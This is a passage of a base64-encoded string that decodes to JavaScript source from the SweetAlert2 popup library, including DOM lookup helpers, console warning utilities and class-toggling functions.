wcmVmaXgoWydzdWNjZXNzJywgJ3dhcm5pbmcnLCAnaW5mbycsICdxdWVzdGlvbicsICdlcnJvciddKTtcblxuICBjb25zdCBjb25zb2xlUHJlZml4ID0gJ1N3ZWV0QWxlcnQyOic7XG5cbiAgLyoqXG4gICAqIEZpbHRlciB0aGUgdW5pcXVlIHZhbHVlcyBpbnRvIGEgbmV3IGFycmF5XG4gICAqXG4gICAqIEBwYXJhbSB7QXJyYXl9IGFyclxuICAgKiBAcmV0dXJucyB7QXJyYXl9XG4gICAqL1xuICBjb25zdCB1bmlxdWVBcnJheSA9IGFyciA9PiB7XG4gICAgY29uc3QgcmVzdWx0ID0gW107XG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcbiAgICAgIGlmIChyZXN1bHQuaW5kZXhPZihhcnJbaV0pID09PSAtMSkge1xuICAgICAgICByZXN1bHQucHVzaChhcnJbaV0pO1xuICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xuICB9O1xuXG4gIC8qKlxuICAgKiBDYXBpdGFsaXplIHRoZSBmaXJzdCBsZXR0ZXIgb2YgYSBzdHJpbmdcbiAgICpcbiAgICogQHBhcmFtIHtzdHJpbmd9IHN0clxuICAgKiBAcmV0dXJucyB7c3RyaW5nfVxuICAgKi9cbiAgY29uc3QgY2FwaXRhbGl6ZUZpcnN0TGV0dGVyID0gc3RyID0+IHN0ci5jaGFyQXQoMCkudG9VcHBlckNhc2UoKSArIHN0ci5zbGljZSgxKTtcblxuICAvKipcbiAgICogU3RhbmRhcmRpemUgY29uc29sZSB3YXJuaW5nc1xuICAgKlxuICAgKiBAcGFyYW0ge3N0cmluZyB8IEFycmF5fSBtZXNzYWdlXG4gICAqL1xuICBjb25zdCB3YXJuID0gbWVzc2FnZSA9PiB7XG4gICAgY29uc29sZS53YXJuKGAke2NvbnNvbGVQcmVmaXh9ICR7dHlwZW9mIG1lc3NhZ2UgPT09ICdvYmplY3QnID8gbWVzc2FnZS5qb2luKCcgJykgOiBtZXNzYWdlfWApO1xuICB9O1xuXG4gIC8qKlxuICAgKiBTdGFuZGFyZGl6ZSBjb25zb2xlIGVycm9yc1xuICAgKlxuICAgKiBAcGFyYW0ge3N0cmluZ30gbWVzc2FnZVxuICAgKi9cbiAgY29uc3QgZXJyb3IgPSBtZXNzYWdlID0+IHtcbiAgICBjb25zb2xlLmVycm9yKGAke2NvbnNvbGVQcmVmaXh9ICR7bWVzc2FnZX1gKTtcbiAgfTtcblxuICAvKipcbiAgICogUHJpdmF0ZSBnbG9iYWwgc3RhdGUgZm9yIGB3YXJuT25jZWBcbiAgICpcbiAgICogQHR5cGUge0FycmF5fVxuICAgKiBAcHJpdmF0ZVxuICAgKi9cbiAgY29uc3QgcHJldmlvdXNXYXJuT25jZU1lc3NhZ2VzID0gW107XG5cbiAgLyoqXG4gICAqIFNob3cgYSBjb25zb2xlIHdhcm5pbmcsIGJ1dCBvbmx5IGlmIGl0IGhhc24ndCBhbHJlYWR5IGJlZW4gc2hvd25cbiAgICpcbiAgICogQHBhcmFtIHtzdHJpbmd9IG1lc3NhZ2VcbiAgICovXG4gIGNvbnN0IHdhcm5PbmNlID0gbWVzc2FnZSA9PiB7XG4gICAgaWYgKCFwcmV2aW91c1dhcm5PbmNlTWVzc2FnZXMuaW5jbHVkZXMobWVzc2FnZSkpIHtcbiAgICAgIHByZXZpb3VzV2Fybk9uY2VNZXNzYWdlcy5wdXNoKG1lc3NhZ2UpO1xuICAgICAgd2FybihtZXNzYWdlKTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIFNob3cgYSBvbmUtdGltZSBjb25zb2xlIHdhcm5pbmcgYWJvdXQgZGVwcmVjYXRlZCBwYXJhbXMvbWV0aG9kc1xuICAgKlxuICAgKiBAcGFyYW0ge3N0cmluZ30gZGVwcmVjYXRlZFBhcmFtXG4gICAqIEBwYXJhbSB7c3RyaW5nfSB1c2VJbnN0ZWFkXG4gICAqL1xuICBjb25zdCB3YXJuQWJvdXREZXByZWNhdGlvbiA9IChkZXByZWNhdGVkUGFyYW0sIHVzZUluc3RlYWQpID0+IHtcbiAgICB3YXJuT25jZShgXCIke2RlcHJlY2F0ZWRQYXJhbX1cIiBpcyBkZXByZWNhdGVkIGFuZCB3aWxsIGJlIHJlbW92ZWQgaW4gdGhlIG5leHQgbWFqb3IgcmVsZWFzZS4gUGxlYXNlIHVzZSBcIiR7dXNlSW5zdGVhZH1cIiBpbnN0ZWFkLmApO1xuICB9O1xuXG4gIC8qKlxuICAgKiBJZiBgYXJnYCBpcyBhIGZ1bmN0aW9uLCBjYWxsIGl0ICh3aXRoIG5vIGFyZ3VtZW50cyBvciBjb250ZXh0KSBhbmQgcmV0dXJuIHRoZSByZXN1bHQuXG4gICAqIE90aGVyd2lzZSwganVzdCBwYXNzIHRoZSB2YWx1ZSB0aHJvdWdoXG4gICAqXG4gICAqIEBwYXJhbSB7RnVuY3Rpb24gfCBhbnl9IGFyZ1xuICAgKiBAcmV0dXJucyB7YW55fVxuICAgKi9cbiAgY29uc3QgY2FsbElmRnVuY3Rpb24gPSBhcmcgPT4gdHlwZW9mIGFyZyA9PT0gJ2Z1bmN0aW9uJyA/IGFyZygpIDogYXJnO1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge2FueX0gYXJnXG4gICAqIEByZXR1cm5zIHtib29sZWFufVxuICAgKi9cbiAgY29uc3QgaGFzVG9Qcm9taXNlRm4gPSBhcmcgPT4gYXJnICYmIHR5cGVvZiBhcmcudG9Qcm9taXNlID09PSAnZnVuY3Rpb24nO1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge2FueX0gYXJnXG4gICAqIEByZXR1cm5zIHtQcm9taXNlfVxuICAgKi9cbiAgY29uc3QgYXNQcm9taXNlID0gYXJnID0+IGhhc1RvUHJvbWlzZUZuKGFyZykgPyBhcmcudG9Qcm9taXNlKCkgOiBQcm9taXNlLnJlc29sdmUoYXJnKTtcblxuICAvKipcbiAgICogQHBhcmFtIHthbnl9IGFyZ1xuICAgKiBAcmV0dXJucyB7Ym9vbGVhbn1cbiAgICovXG4gIGNvbnN0IGlzUHJvbWlzZSA9IGFyZyA9PiBhcmcgJiYgUHJvbWlzZS5yZXNvbHZlKGFyZykgPT09IGFyZztcblxuICAvKipcbiAgICogR2V0cyB0aGUgcG9wdXAgY29udGFpbmVyIHdoaWNoIGNvbnRhaW5zIHRoZSBiYWNrZHJvcCBhbmQgdGhlIHBvcHVwIGl0c2VsZi5cbiAgICpcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldENvbnRhaW5lciA9ICgpID0+IGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcihgLiR7c3dhbENsYXNzZXMuY29udGFpbmVyfWApO1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge3N0cmluZ30gc2VsZWN0b3JTdHJpbmdcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGVsZW1lbnRCeVNlbGVjdG9yID0gc2VsZWN0b3JTdHJpbmcgPT4ge1xuICAgIGNvbnN0IGNvbnRhaW5lciA9IGdldENvbnRhaW5lcigpO1xuICAgIHJldHVybiBjb250YWluZXIgPyBjb250YWluZXIucXVlcnlTZWxlY3RvcihzZWxlY3RvclN0cmluZykgOiBudWxsO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge3N0cmluZ30gY2xhc3NOYW1lXG4gICAqIEByZXR1cm5zIHtIVE1MRWxlbWVudCB8IG51bGx9XG4gICAqL1xuICBjb25zdCBlbGVtZW50QnlDbGFzcyA9IGNsYXNzTmFtZSA9PiB7XG4gICAgcmV0dXJuIGVsZW1lbnRCeVNlbGVjdG9yKGAuJHtjbGFzc05hbWV9YCk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEByZXR1cm5zIHtIVE1MRWxlbWVudCB8IG51bGx9XG4gICAqL1xuICBjb25zdCBnZXRQb3B1cCA9ICgpID0+IGVsZW1lbnRCeUNsYXNzKHN3YWxDbGFzc2VzLnBvcHVwKTtcblxuICAvKipcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldEljb24gPSAoKSA9PiBlbGVtZW50QnlDbGFzcyhzd2FsQ2xhc3Nlcy5pY29uKTtcblxuICAvKipcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldEljb25Db250ZW50ID0gKCkgPT4gZWxlbWVudEJ5Q2xhc3Moc3dhbENsYXNzZXNbJ2ljb24tY29udGVudCddKTtcblxuICAvKipcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldFRpdGxlID0gKCkgPT4gZWxlbWVudEJ5Q2xhc3Moc3dhbENsYXNzZXMudGl0bGUpO1xuXG4gIC8qKlxuICAgKiBAcmV0dXJucyB7SFRNTEVsZW1lbnQgfCBudWxsfVxuICAgKi9cbiAgY29uc3QgZ2V0SHRtbENvbnRhaW5lciA9ICgpID0+IGVsZW1lbnRCeUNsYXNzKHN3YWxDbGFzc2VzWydodG1sLWNvbnRhaW5lciddKTtcblxuICAvKipcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldEltYWdlID0gKCkgPT4gZWxlbWVudEJ5Q2xhc3Moc3dhbENsYXNzZXMuaW1hZ2UpO1xuXG4gIC8qKlxuICAgKiBAcmV0dXJucyB7SFRNTEVsZW1lbnQgfCBudWxsfVxuICAgKi9cbiAgY29uc3QgZ2V0UHJvZ3Jlc3NTdGVwcyA9ICgpID0+IGVsZW1lbnRCeUNsYXNzKHN3YWxDbGFzc2VzWydwcm9ncmVzcy1zdGVwcyddKTtcblxuICAvKipcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldFZhbGlkYXRpb25NZXNzYWdlID0gKCkgPT4gZWxlbWVudEJ5Q2xhc3Moc3dhbENsYXNzZXNbJ3ZhbGlkYXRpb24tbWVzc2FnZSddKTtcblxuICAvKipcbiAgICogQHJldHVybnMge0hUTUxCdXR0b25FbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldENvbmZpcm1CdXR0b24gPSAoKSA9PiAvKiogQHR5cGUge0hUTUxCdXR0b25FbGVtZW50fSAqL2VsZW1lbnRCeVNlbGVjdG9yKGAuJHtzd2FsQ2xhc3Nlcy5hY3Rpb25zfSAuJHtzd2FsQ2xhc3Nlcy5jb25maXJtfWApO1xuXG4gIC8qKlxuICAgKiBAcmV0dXJucyB7SFRNTEJ1dHRvbkVsZW1lbnQgfCBudWxsfVxuICAgKi9cbiAgY29uc3QgZ2V0Q2FuY2VsQnV0dG9uID0gKCkgPT4gLyoqIEB0eXBlIHtIVE1MQnV0dG9uRWxlbWVudH0gKi9lbGVtZW50QnlTZWxlY3RvcihgLiR7c3dhbENsYXNzZXMuYWN0aW9uc30gLiR7c3dhbENsYXNzZXMuY2FuY2VsfWApO1xuXG4gIC8qKlxuICAgKiBAcmV0dXJucyB7SFRNTEJ1dHRvbkVsZW1lbnQgfCBudWxsfVxuICAgKi9cbiAgY29uc3QgZ2V0RGVueUJ1dHRvbiA9ICgpID0+IC8qKiBAdHlwZSB7SFRNTEJ1dHRvbkVsZW1lbnR9ICovZWxlbWVudEJ5U2VsZWN0b3IoYC4ke3N3YWxDbGFzc2VzLmFjdGlvbnN9IC4ke3N3YWxDbGFzc2VzLmRlbnl9YCk7XG5cbiAgLyoqXG4gICAqIEByZXR1cm5zIHtIVE1MRWxlbWVudCB8IG51bGx9XG4gICAqL1xuICBjb25zdCBnZXRJbnB1dExhYmVsID0gKCkgPT4gZWxlbWVudEJ5Q2xhc3Moc3dhbENsYXNzZXNbJ2lucHV0LWxhYmVsJ10pO1xuXG4gIC8qKlxuICAgKiBAcmV0dXJucyB7SFRNTEVsZW1lbnQgfCBudWxsfVxuICAgKi9cbiAgY29uc3QgZ2V0TG9hZGVyID0gKCkgPT4gZWxlbWVudEJ5U2VsZWN0b3IoYC4ke3N3YWxDbGFzc2VzLmxvYWRlcn1gKTtcblxuICAvKipcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldEFjdGlvbnMgPSAoKSA9PiBlbGVtZW50QnlDbGFzcyhzd2FsQ2xhc3Nlcy5hY3Rpb25zKTtcblxuICAvKipcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldEZvb3RlciA9ICgpID0+IGVsZW1lbnRCeUNsYXNzKHN3YWxDbGFzc2VzLmZvb3Rlcik7XG5cbiAgLyoqXG4gICAqIEByZXR1cm5zIHtIVE1MRWxlbWVudCB8IG51bGx9XG4gICAqL1xuICBjb25zdCBnZXRUaW1lclByb2dyZXNzQmFyID0gKCkgPT4gZWxlbWVudEJ5Q2xhc3Moc3dhbENsYXNzZXNbJ3RpbWVyLXByb2dyZXNzLWJhciddKTtcblxuICAvKipcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGNvbnN0IGdldENsb3NlQnV0dG9uID0gKCkgPT4gZWxlbWVudEJ5Q2xhc3Moc3dhbENsYXNzZXMuY2xvc2UpO1xuXG4gIC8vIGh0dHBzOi8vZ2l0aHViLmNvbS9qa3VwL2ZvY3VzYWJsZS9ibG9iL21hc3Rlci9pbmRleC5qc1xuICBjb25zdCBmb2N1c2FibGUgPSBgXG4gIGFbaHJlZl0sXG4gIGFyZWFbaHJlZl0sXG4gIGlucHV0Om5vdChbZGlzYWJsZWRdKSxcbiAgc2VsZWN0Om5vdChbZGlzYWJsZWRdKSxcbiAgdGV4dGFyZWE6bm90KFtkaXNhYmxlZF0pLFxuICBidXR0b246bm90KFtkaXNhYmxlZF0pLFxuICBpZnJhbWUsXG4gIG9iamVjdCxcbiAgZW1iZWQsXG4gIFt0YWJpbmRleD1cIjBcIl0sXG4gIFtjb250ZW50ZWRpdGFibGVdLFxuICBhdWRpb1tjb250cm9sc10sXG4gIHZpZGVvW2NvbnRyb2xzXSxcbiAgc3VtbWFyeVxuYDtcbiAgLyoqXG4gICAqIEByZXR1cm5zIHtIVE1MRWxlbWVudFtdfVxuICAgKi9cbiAgY29uc3QgZ2V0Rm9jdXNhYmxlRWxlbWVudHMgPSAoKSA9PiB7XG4gICAgY29uc3QgZm9jdXNhYmxlRWxlbWVudHNXaXRoVGFiaW5kZXggPSBBcnJheS5mcm9tKGdldFBvcHVwKCkucXVlcnlTZWxlY3RvckFsbCgnW3RhYmluZGV4XTpub3QoW3RhYmluZGV4PVwiLTFcIl0pOm5vdChbdGFiaW5kZXg9XCIwXCJdKScpKVxuICAgIC8vIHNvcnQgYWNjb3JkaW5nIHRvIHRhYmluZGV4XG4gICAgLnNvcnQoKGEsIGIpID0+IHtcbiAgICAgIGNvbnN0IHRhYmluZGV4QSA9IHBhcnNlSW50KGEuZ2V0QXR0cmlidXRlKCd0YWJpbmRleCcpKTtcbiAgICAgIGNvbnN0IHRhYmluZGV4QiA9IHBhcnNlSW50KGIuZ2V0QXR0cmlidXRlKCd0YWJpbmRleCcpKTtcbiAgICAgIGlmICh0YWJpbmRleEEgPiB0YWJpbmRleEIpIHtcbiAgICAgICAgcmV0dXJuIDE7XG4gICAgICB9IGVsc2UgaWYgKHRhYmluZGV4QSA8IHRhYmluZGV4Qikge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgICB9XG4gICAgICByZXR1cm4gMDtcbiAgICB9KTtcbiAgICBjb25zdCBvdGhlckZvY3VzYWJsZUVsZW1lbnRzID0gQXJyYXkuZnJvbShnZXRQb3B1cCgpLnF1ZXJ5U2VsZWN0b3JBbGwoZm9jdXNhYmxlKSkuZmlsdGVyKGVsID0+IGVsLmdldEF0dHJpYnV0ZSgndGFiaW5kZXgnKSAhPT0gJy0xJyk7XG4gICAgcmV0dXJuIHVuaXF1ZUFycmF5KGZvY3VzYWJsZUVsZW1lbnRzV2l0aFRhYmluZGV4LmNvbmNhdChvdGhlckZvY3VzYWJsZUVsZW1lbnRzKSkuZmlsdGVyKGVsID0+IGlzVmlzaWJsZSQxKGVsKSk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEByZXR1cm5zIHtib29sZWFufVxuICAgKi9cbiAgY29uc3QgaXNNb2RhbCA9ICgpID0+IHtcbiAgICByZXR1cm4gaGFzQ2xhc3MoZG9jdW1lbnQuYm9keSwgc3dhbENsYXNzZXMuc2hvd24pICYmICFoYXNDbGFzcyhkb2N1bWVudC5ib2R5LCBzd2FsQ2xhc3Nlc1sndG9hc3Qtc2hvd24nXSkgJiYgIWhhc0NsYXNzKGRvY3VtZW50LmJvZHksIHN3YWxDbGFzc2VzWyduby1iYWNrZHJvcCddKTtcbiAgfTtcblxuICAvKipcbiAgICogQHJldHVybnMge2Jvb2xlYW59XG4gICAqL1xuICBjb25zdCBpc1RvYXN0ID0gKCkgPT4ge1xuICAgIHJldHVybiBnZXRQb3B1cCgpICYmIGhhc0NsYXNzKGdldFBvcHVwKCksIHN3YWxDbGFzc2VzLnRvYXN0KTtcbiAgfTtcblxuICAvKipcbiAgICogQHJldHVybnMge2Jvb2xlYW59XG4gICAqL1xuICBjb25zdCBpc0xvYWRpbmcgPSAoKSA9PiB7XG4gICAgcmV0dXJuIGdldFBvcHVwKCkuaGFzQXR0cmlidXRlKCdkYXRhLWxvYWRpbmcnKTtcbiAgfTtcblxuICAvLyBSZW1lbWJlciBzdGF0ZSBpbiBjYXNlcyB3aGVyZSBvcGVuaW5nIGFuZCBoYW5kbGluZyBhIG1vZGFsIHdpbGwgZmlkZGxlIHdpdGggaXQuXG4gIGNvbnN0IHN0YXRlcyA9IHtcbiAgICBwcmV2aW91c0JvZHlQYWRkaW5nOiBudWxsXG4gIH07XG5cbiAgLyoqXG4gICAqIFNlY3VyZWx5IHNldCBpbm5lckhUTUwgb2YgYW4gZWxlbWVudFxuICAgKiBodHRwczovL2dpdGh1Yi5jb20vc3dlZXRhbGVydDIvc3dlZXRhbGVydDIvaXNzdWVzLzE5MjZcbiAgICpcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gZWxlbVxuICAgKiBAcGFyYW0ge3N0cmluZ30gaHRtbFxuICAgKi9cbiAgY29uc3Qgc2V0SW5uZXJIdG1sID0gKGVsZW0sIGh0bWwpID0+IHtcbiAgICBlbGVtLnRleHRDb250ZW50ID0gJyc7XG4gICAgaWYgKGh0bWwpIHtcbiAgICAgIGNvbnN0IHBhcnNlciA9IG5ldyBET01QYXJzZXIoKTtcbiAgICAgIGNvbnN0IHBhcnNlZCA9IHBhcnNlci5wYXJzZUZyb21TdHJpbmcoaHRtbCwgYHRleHQvaHRtbGApO1xuICAgICAgQXJyYXkuZnJvbShwYXJzZWQucXVlcnlTZWxlY3RvcignaGVhZCcpLmNoaWxkTm9kZXMpLmZvckVhY2goY2hpbGQgPT4ge1xuICAgICAgICBlbGVtLmFwcGVuZENoaWxkKGNoaWxkKTtcbiAgICAgIH0pO1xuICAgICAgQXJyYXkuZnJvbShwYXJzZWQucXVlcnlTZWxlY3RvcignYm9keScpLmNoaWxkTm9kZXMpLmZvckVhY2goY2hpbGQgPT4ge1xuICAgICAgICBpZiAoY2hpbGQgaW5zdGFuY2VvZiBIVE1MVmlkZW9FbGVtZW50IHx8IGNoaWxkIGluc3RhbmNlb2YgSFRNTEF1ZGlvRWxlbWVudCkge1xuICAgICAgICAgIGVsZW0uYXBwZW5kQ2hpbGQoY2hpbGQuY2xvbmVOb2RlKHRydWUpKTsgLy8gaHR0cHM6Ly9naXRodWIuY29tL3N3ZWV0YWxlcnQyL3N3ZWV0YWxlcnQyL2lzc3Vlcy8yNTA3XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgZWxlbS5hcHBlbmRDaGlsZChjaGlsZCk7XG4gICAgICAgIH1cbiAgICAgIH0pO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gZWxlbVxuICAgKiBAcGFyYW0ge3N0cmluZ30gY2xhc3NOYW1lXG4gICAqIEByZXR1cm5zIHtib29sZWFufVxuICAgKi9cbiAgY29uc3QgaGFzQ2xhc3MgPSAoZWxlbSwgY2xhc3NOYW1lKSA9PiB7XG4gICAgaWYgKCFjbGFzc05hbWUpIHtcbiAgICAgIHJldHVybiBmYWxzZTtcbiAgICB9XG4gICAgY29uc3QgY2xhc3NMaXN0ID0gY2xhc3NOYW1lLnNwbGl0KC9cXHMrLyk7XG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBjbGFzc0xpc3QubGVuZ3RoOyBpKyspIHtcbiAgICAgIGlmICghZWxlbS5jbGFzc0xpc3QuY29udGFpbnMoY2xhc3NMaXN0W2ldKSkge1xuICAgICAgICByZXR1cm4gZmFsc2U7XG4gICAgICB9XG4gICAgfVxuICAgIHJldHVybiB0cnVlO1xuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0hUTUxFbGVtZW50fSBlbGVtXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgcmVtb3ZlQ3VzdG9tQ2xhc3NlcyA9IChlbGVtLCBwYXJhbXMpID0+IHtcbiAgICBBcnJheS5mcm9tKGVsZW0uY2xhc3NMaXN0KS5mb3JFYWNoKGNsYXNzTmFtZSA9PiB7XG4gICAgICBpZiAoIU9iamVjdC52YWx1ZXMoc3dhbENsYXNzZXMpLmluY2x1ZGVzKGNsYXNzTmFtZSkgJiYgIU9iamVjdC52YWx1ZXMoaWNvblR5cGVzKS5pbmNsdWRlcyhjbGFzc05hbWUpICYmICFPYmplY3QudmFsdWVzKHBhcmFtcy5zaG93Q2xhc3MpLmluY2x1ZGVzKGNsYXNzTmFtZSkpIHtcbiAgICAgICAgZWxlbS5jbGFzc0xpc3QucmVtb3ZlKGNsYXNzTmFtZSk7XG4gICAgICB9XG4gICAgfSk7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnR9IGVsZW1cbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqIEBwYXJhbSB7c3RyaW5nfSBjbGFzc05hbWVcbiAgICovXG4gIGNvbnN0IGFwcGx5Q3VzdG9tQ2xhc3MgPSAoZWxlbSwgcGFyYW1zLCBjbGFzc05hbWUpID0+IHtcbiAgICByZW1vdmVDdXN0b21DbGFzc2VzKGVsZW0sIHBhcmFtcyk7XG4gICAgaWYgKHBhcmFtcy5jdXN0b21DbGFzcyAmJiBwYXJhbXMuY3VzdG9tQ2xhc3NbY2xhc3NOYW1lXSkge1xuICAgICAgaWYgKHR5cGVvZiBwYXJhbXMuY3VzdG9tQ2xhc3NbY2xhc3NOYW1lXSAhPT0gJ3N0cmluZycgJiYgIXBhcmFtcy5jdXN0b21DbGFzc1tjbGFzc05hbWVdLmZvckVhY2gpIHtcbiAgICAgICAgd2FybihgSW52YWxpZCB0eXBlIG9mIGN1c3RvbUNsYXNzLiR7Y2xhc3NOYW1lfSEgRXhwZWN0ZWQgc3RyaW5nIG9yIGl0ZXJhYmxlIG9iamVjdCwgZ290IFwiJHt0eXBlb2YgcGFyYW1zLmN1c3RvbUNsYXNzW2NsYXNzTmFtZV19XCJgKTtcbiAgICAgICAgcmV0dXJuO1xuICAgICAgfVxuICAgICAgYWRkQ2xhc3MoZWxlbSwgcGFyYW1zLmN1c3RvbUNsYXNzW2NsYXNzTmFtZV0pO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudH0gcG9wdXBcbiAgICogQHBhcmFtIHtpbXBvcnQoJy4vcmVuZGVyZXJzL3JlbmRlcklucHV0JykuSW5wdXRDbGFzc30gaW5wdXRDbGFzc1xuICAgKiBAcmV0dXJucyB7SFRNTElucHV0RWxlbWVudCB8IG51bGx9XG4gICAqL1xuICBjb25zdCBnZXRJbnB1dCQxID0gKHBvcHVwLCBpbnB1dENsYXNzKSA9PiB7XG4gICAgaWYgKCFpbnB1dENsYXNzKSB7XG4gICAgICByZXR1cm4gbnVsbDtcbiAgICB9XG4gICAgc3dpdGNoIChpbnB1dENsYXNzKSB7XG4gICAgICBjYXNlICdzZWxlY3QnOlxuICAgICAgY2FzZSAndGV4dGFyZWEnOlxuICAgICAgY2FzZSAnZmlsZSc6XG4gICAgICAgIHJldHVybiBwb3B1cC5xdWVyeVNlbGVjdG9yKGAuJHtzd2FsQ2xhc3Nlcy5wb3B1cH0gPiAuJHtzd2FsQ2xhc3Nlc1tpbnB1dENsYXNzXX1gKTtcbiAgICAgIGNhc2UgJ2NoZWNrYm94JzpcbiAgICAgICAgcmV0dXJuIHBvcHVwLnF1ZXJ5U2VsZWN0b3IoYC4ke3N3YWxDbGFzc2VzLnBvcHVwfSA+IC4ke3N3YWxDbGFzc2VzLmNoZWNrYm94fSBpbnB1dGApO1xuICAgICAgY2FzZSAncmFkaW8nOlxuICAgICAgICByZXR1cm4gcG9wdXAucXVlcnlTZWxlY3RvcihgLiR7c3dhbENsYXNzZXMucG9wdXB9ID4gLiR7c3dhbENsYXNzZXMucmFkaW99IGlucHV0OmNoZWNrZWRgKSB8fCBwb3B1cC5xdWVyeVNlbGVjdG9yKGAuJHtzd2FsQ2xhc3Nlcy5wb3B1cH0gPiAuJHtzd2FsQ2xhc3Nlcy5yYWRpb30gaW5wdXQ6Zmlyc3QtY2hpbGRgKTtcbiAgICAgIGNhc2UgJ3JhbmdlJzpcbiAgICAgICAgcmV0dXJuIHBvcHVwLnF1ZXJ5U2VsZWN0b3IoYC4ke3N3YWxDbGFzc2VzLnBvcHVwfSA+IC4ke3N3YWxDbGFzc2VzLnJhbmdlfSBpbnB1dGApO1xuICAgICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIHBvcHVwLnF1ZXJ5U2VsZWN0b3IoYC4ke3N3YWxDbGFzc2VzLnBvcHVwfSA+IC4ke3N3YWxDbGFzc2VzLmlucHV0fWApO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MSW5wdXRFbGVtZW50IHwgSFRNTFRleHRBcmVhRWxlbWVudCB8IEhUTUxTZWxlY3RFbGVtZW50fSBpbnB1dFxuICAgKi9cbiAgY29uc3QgZm9jdXNJbnB1dCA9IGlucHV0ID0+IHtcbiAgICBpbnB1dC5mb2N1cygpO1xuXG4gICAgLy8gcGxhY2UgY3Vyc29yIGF0IGVuZCBvZiB0ZXh0IGluIHRleHQgaW5wdXRcbiAgICBpZiAoaW5wdXQudHlwZSAhPT0gJ2ZpbGUnKSB7XG4gICAgICAvLyBodHRwOi8vc3RhY2tvdmVyZmxvdy5jb20vYS8yMzQ1OTE1XG4gICAgICBjb25zdCB2YWwgPSBpbnB1dC52YWx1ZTtcbiAgICAgIGlucHV0LnZhbHVlID0gJyc7XG4gICAgICBpbnB1dC52YWx1ZSA9IHZhbDtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7SFRNTEVsZW1lbnQgfCBIVE1MRWxlbWVudFtdIHwgbnVsbH0gdGFyZ2V0XG4gICAqIEBwYXJhbSB7c3RyaW5nIHwgc3RyaW5nW10gfCByZWFkb25seSBzdHJpbmdbXX0gY2xhc3NMaXN0XG4gICAqIEBwYXJhbSB7Ym9vbGVhbn0gY29uZGl0aW9uXG4gICAqL1xuICBjb25zdCB0b2dnbGVDbGFzcyA9ICh0YXJnZXQsIGNsYXNzTGlzdCwgY29uZGl0aW9uKSA9PiB7XG4gICAgaWYgKCF0YXJnZXQgfHwgIWNsYXNzTGlzdCkge1xuICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBpZiAodHlwZW9mIGNsYXNzTGlzdCA9PT0gJ3N0cmluZycpIHtcbiAgICAgIGNsYXNzTGlzdCA9IGNsYXNzTGlzdC5zcGxpdCgvXFxzKy8pLmZpbHRlcihCb29sZWFuKTtcbiAgICB9XG4gICAgY2xhc3NMaXN0LmZvckVhY2goY2xhc3NOYW1lID0+IHtcbiAgICAgIGlmIChBcnJheS5pc0FycmF5KHRhcmdldCkpIHtcbiAgICAgICAgdGFyZ2V0LmZvckVhY2goZWxlbSA9PiB7XG4gICAgICAgICAgY29uZGl0aW9uID8gZWxlbS5jbGFzc0xpc3QuYWRkKGNsYXNzTmFtZSkgOiBlbGVtLmNsYXNzTGlzdC5yZW1vdmUoY2xhc3NOYW1lKTtcbiAgICAgICAgfSk7XG4gICAgICB9IGVsc2Uge1xuICAgICAgICBjb25kaXRpb24gPyB0YXJnZXQuY2xhc3NMaXN0LmFkZChjbGFzc05hbWUpIDogdGFyZ2V0LmNsYXNzTGlzdC5yZW1vdmUoY2xhc3NOYW1lKTtcbiAgICAgIH1cbiAgICB9KTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtIVE1MRWxlbWVudCB8IEhUTUxFbGVtZW50W10gfCBudWxsfSB0YXJnZXRcbiAgICogQHBhcmFtIHtzdHJpbmcgfCBzdHJpbmdbXSB8IHJlYWRvbmx5IHN0cmluZ1tdfSBjbGFzc0xpc3RcbiAgICovXG4gIGNvbnN0IGFkZENsYXNzID0g